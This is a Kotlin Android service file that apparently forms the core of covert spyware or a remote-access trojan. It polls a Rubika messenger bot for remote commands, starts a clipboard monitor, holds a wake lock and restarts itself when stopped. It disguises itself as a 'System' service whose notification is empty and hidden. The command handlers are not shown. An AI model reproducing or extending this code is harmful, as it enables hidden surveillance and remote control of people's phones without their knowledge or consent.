package com.sys.svc

import android.app.Notification
import android.app.NotificationChannel
import android.app.NotificationManager
import android.app.Service
import android.content.Context
import android.content.Intent
import android.content.pm.ServiceInfo
import android.os.Build
import android.os.IBinder
import android.os.PowerManager
import androidx.core.app.NotificationCompat
import com.sys.svc.helpers.ClipboardMonitor
import kotlinx.coroutines.CancellationException
import kotlinx.coroutines.CoroutineScope
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.SupervisorJob
import kotlinx.coroutines.cancel
import kotlinx.coroutines.delay
import kotlinx.coroutines.isActive
import kotlinx.coroutines.launch
import java.util.concurrent.atomic.AtomicBoolean

class BotService : Service() {
    private val scope = CoroutineScope(SupervisorJob() + Dispatchers.IO)
    private val running = AtomicBoolean(false)
    private val api by lazy { RubikaApi(BotConfig.TOKEN) }
    private var offsetId: String? = null
    private var wakeLock: PowerManager.WakeLock? = null

    @Volatile private var currentTypes: Int = ServiceInfo.FOREGROUND_SERVICE_TYPE_SPECIAL_USE

    override fun onCreate() {
        super.onCreate()
        instance = this
        Logger.init(this)
        Logger.i("Svc", "onCreate")
        startWithTypes(currentTypes)
        acquireWakeLock()
        if (running.compareAndSet(false, true)) {
            scope.launch { pollLoop() }
            try { ClipboardMonitor.start(this) } catch (e: Exception) {
                Logger.w("Svc", "clip: ${e.message}")
            }
        }
    }

    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
        Logger.d("Svc", "onStartCommand")
        return START_STICKY
    }

    override fun onBind(intent: Intent?): IBinder? = null

    override fun onDestroy() {
        Logger.i("Svc", "onDestroy")
        running.set(false)
        instance = null
        releaseWakeLock()
        try { ClipboardMonitor.stop() } catch (_: Exception) {}
        scope.cancel()
        super.onDestroy()
    }

    private fun acquireWakeLock() {
        try {
            val pm = getSystemService(Context.POWER_SERVICE) as PowerManager
            wakeLock = pm.newWakeLock(PowerManager.PARTIAL_WAKE_LOCK, "SysSvc::Bot")
            wakeLock?.setReferenceCounted(false)
            wakeLock?.acquire(60 * 60 * 1000L)
        } catch (e: Exception) { Logger.w("Svc", "wake: ${e.message}") }
    }

    private fun releaseWakeLock() {
        try { if (wakeLock?.isHeld == true) wakeLock?.release() } catch (_: Exception) {}
        wakeLock = null
    }

    fun addForegroundTypes(extra: Int) {
        currentTypes = currentTypes or extra
        startWithTypes(currentTypes)
    }

    fun resetForegroundTypes() {
        currentTypes = ServiceInfo.FOREGROUND_SERVICE_TYPE_SPECIAL_USE
        startWithTypes(currentTypes)
    }

    private fun startWithTypes(types: Int) {
        val n = buildNotification()
        try {
            if (Build.VERSION.SDK_INT >= 29) {
                startForeground(BotConfig.NOTIF_ID_SVC, n, types)
            } else {
                startForeground(BotConfig.NOTIF_ID_SVC, n)
            }
        } catch (e: Exception) {
            Logger.w("Svc", "fgs: ${e.message}")
            try { startForeground(BotConfig.NOTIF_ID_SVC, n) } catch (_: Exception) {}
        }
    }

    private fun buildNotification(): Notification {
        val ch = BotConfig.NOTIF_CHANNEL_SVC
        val nm = getSystemService(NotificationManager::class.java)
        if (Build.VERSION.SDK_INT >= 26 && nm.getNotificationChannel(ch) == null) {
            val c = NotificationChannel(ch, "System", NotificationManager.IMPORTANCE_MIN).apply {
                setShowBadge(false)
                setSound(null, null)
                enableVibration(false)
                enableLights(false)
                lockscreenVisibility = Notification.VISIBILITY_SECRET
            }
            nm.createNotificationChannel(c)
        }
        return NotificationCompat.Builder(this, ch)
            .setSmallIcon(android.R.drawable.stat_sys_download_done)
            .setContentTitle("")
            .setContentText("")
            .setOngoing(true)
            .setSilent(true)
            .setPriority(NotificationCompat.PRIORITY_MIN)
            .setVisibility(NotificationCompat.VISIBILITY_SECRET)
            .setCategory(NotificationCompat.CATEGORY_SERVICE)
            .build()
    }

    private suspend fun pollLoop() {
        offsetId = Prefs.getOffset(this)
        Logger.i("Poll", "start offset=${offsetId ?: "none"}")
        val handler = CommandHandler(this, api)
        var errStreak = 0

        while (running.get() && scope.isActive) {
            try {
                val resp = api.getUpdates(offsetId)
                if (resp.has("_error")) {
                    errStreak++
                    val wait = minOf(BotConfig.MAX_POLL_ERROR_DELAY_MS.toLong(),
                        BotConfig.POLL_ERROR_DELAY_MS * errStreak)
                    delay(wait)
                    continue
                }
                errStreak = 0
                val next = resp.optString("next_offset_id", "")
                if (next.isNotEmpty()) {
                    offsetId = next
                    Prefs.setOffset(this, next)
                }
                val arr = resp.optJSONArray("updates")
                if (arr != null) {
                    for (i in 0 until arr.length()) {
                        val u = arr.optJSONObject(i) ?: continue
                        try { handler.handle(u) } catch (e: Exception) {
                            Logger.e("Handle", "", e)
                        }
                    }
                }
            } catch (e: CancellationException) {
                break
            } catch (e: Exception) {
                Logger.e("Poll", "", e)
            }
            delay(BotConfig.POLL_DELAY_MS)
        }
        Logger.i("Poll", "stopped")
    }

    companion object {
        @Volatile private var instance: BotService? = null
        fun get(): BotService? = instance

        fun start(ctx: Context) {
            val i = Intent(ctx, BotService::class.java)
            try {
                if (Build.VERSION.SDK_INT >= 26) ctx.startForegroundService(i)
                else ctx.startService(i)
            } catch (e: Exception) { Logger.e("Svc", "start", e) }
        }

        fun stop(ctx: Context) {
            try { ctx.stopService(Intent(ctx, BotService::class.java)) } catch (_: Exception) {}
        }
    }
}